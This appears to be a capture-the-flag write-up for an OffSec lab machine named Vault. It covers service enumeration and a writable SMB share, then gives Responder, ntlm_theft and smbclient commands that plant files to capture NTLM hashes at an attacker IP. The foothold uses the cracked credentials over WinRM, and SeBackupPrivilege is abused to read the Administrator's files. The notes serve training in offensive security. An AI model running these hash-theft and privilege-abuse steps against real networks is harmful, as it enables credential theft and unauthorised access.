### ++ Approach 192.168.168.172 ++
#### Credentials
	* anirudh:SecureHM (vault.offsec)

#### Services
	##### 53 DNS
		Domain: vault.offsec
        DC: DC.vault.offsec

	##### 135 RPC
		Null session, no useful info

	##### 139,445 SMB
		Null session
            Share 'DocumentsShare', we can put files in here
                Maybe putting a file to get something with responder

	##### 389 Ldap
		No anonymous access

	##### 3389 RDP
		-

	##### 5985 WinRM
		-

### ++ Vulnerabilities ++

#### Vuln 1: Null session through SMB and write permissions ++
	* We can get a null session through SMB and place malicious files in 'DocumentsShare' Share

### ++ System Interaction ++
#### Foothold  
	* In 'DocumentsShare' Share we can place malicious file created with **[ntlm_theft](https://github.com/Greenwolf/ntlm_theft)** and steal the hash through responder
    * Commands:
        sudo responder -I tun0
        python3 ntlm_theft.py -g all -s 192.168.45.195 -f malicious
        smbclient -N //192.168.168.172/DocumentsShare
            smb: \> put malicious-(frameset).docx
            smb: \> put malicious.pdf
            smb: \> put malicious.lnk
    * After retrieve the hash and crack it we get anirudh:SecureHM credentials and connect through WinRM

#### Privilege Escalation 
	* The user anirudh has the SeBackupPrivilege, which we can abuse using **[this](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)** script to get access to whatever file we want
    * Commands:
        Import-Module .\Acl-FullControl.ps1
        Acl-FullControl -user vault\anirudh -path C:\Users\Administrator -
        type C:\Users\Administrator\Desktop\proof.txt